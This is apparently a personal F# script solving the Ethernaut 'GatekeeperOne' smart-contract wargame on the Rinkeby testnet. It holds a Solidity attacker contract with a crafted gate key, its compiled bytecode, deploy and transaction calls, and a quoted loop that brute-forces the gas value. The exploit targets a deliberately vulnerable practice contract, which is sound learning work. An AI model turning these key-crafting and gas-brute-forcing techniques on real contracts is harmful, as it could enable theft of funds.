#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env =createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb


// My instance: 0x2ad0595B8A83a6561cf3A16133ce78126A9B3385


// This was super obnoxious to work out in advance, because apparently the amount of gas units consumed scales with the amount of gas specified...because reasons. The 'key'
// portion was easy by comparison. The tell was that the last 2 hexbytes needed to be equal to the last 2 hexbytes of my address. After that, it was just
// modifying the value so that the top 4 hexbytes looked different than the top half of the bottom 4 hexbytes (1100 != 0000) to pass the 

(*
    contract GateTourist {

    function enterGate() public {
        GatekeeperOne gate = GatekeeperOne(0x2ad0595B8A83a6561cf3A16133ce78126A9B3385);
        bytes8 key = 0x1100000000003a46; // last two hexbytes of my address, and a couple of 1's to keep the top 4 bytes from looking like the padding 0's on the bottom 4 bytes.
        gate.enter(key);
    }
}
*)

//let gateTouristBytecode = """608060405234801561001057600080fd5b50610147806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063c8ad249914610030575b600080fd5b61003861003a565b005b6000732ad0595b8a83a6561cf3a16133ce78126a9b338590506000671100000000003a4660c01b90508173ffffffffffffffffffffffffffffffffffffffff16633370204e826040518263ffffffff1660e01b8152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b1580156100d157600080fd5b505af11580156100e5573d6000803e3d6000fd5b505050506040513d60208110156100fb57600080fd5b810190808051906020019092919050505050505056fea264697066735822122091d518a608d02aa45ae34a4a9788784d2014ac48646e0ed73308979a2a47201164736f6c634300060c0033""" |> RawContractBytecode
let gateTouristABI = """[{"inputs":[],"name":"enterGate","outputs":[],"stateMutability":"nonpayable","type":"function"}]""" |> ABI

prepareUndeployedContract env gateTouristBytecode None RINKEBY gateTouristABI
|> Result.bind (deployEthContract env ZEROV)
|> env.log Log

// My gateTourist: 0x9c1d5c7d777058cd92267f2a8cfe3a6967004783


let deployedTourist = loadDeployedContract env "0x9c1d5c7d777058cd92267f2a8cfe3a6967004783" RINKEBY gateTouristABI |> bindDeployedContract |> List.head

// Send with gas set to 99200
txn deployedTourist (ByString "enterGate") [] ZEROV
|> env.log Log



// Apparently...the 'solution' was to basically "bang it until it works"...
(*
    for (uint256 i = 0; i < 120; i++) {
      (bool result, ) = address(GatekeeperOneContractAddress).call{gas: i + 150 + 8191 * 3}(encodedParams);
      if(result)
        {
        break;
    }
}
*)

// However, in Remix, when I tried to use a {gas} parameter in my external call, the 'gas remaining' in the calculation didn't seem to care in the least about the manual
// gas value I sent, but rather the gas I specified in the entire transaction.
